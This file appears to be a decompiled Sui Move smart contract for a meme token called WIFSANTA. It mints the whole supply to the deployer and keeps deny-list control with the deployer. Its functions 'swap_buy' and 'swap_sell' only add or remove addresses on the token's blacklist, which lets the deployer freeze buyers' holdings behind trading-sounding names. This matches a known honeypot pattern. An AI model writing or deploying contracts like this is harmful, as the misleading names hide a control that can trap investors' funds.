module 0x4704ad66d653d65d1c31b4969893b432b2ae72e374c225664ca0173e84a28be7::wifsanta {
    struct WIFSANTA has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: WIFSANTA, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<WIFSANTA>(arg0, 9, b"WIFSANTA", b"DogWifSantaHat", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmQZLwVhqujqwVnV2EZJ8pJoVWitRgcnJU3o5FZwvS3DGD"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<WIFSANTA>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<WIFSANTA>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<WIFSANTA>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<WIFSANTA>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WIFSANTA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<WIFSANTA>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<WIFSANTA>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<WIFSANTA>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

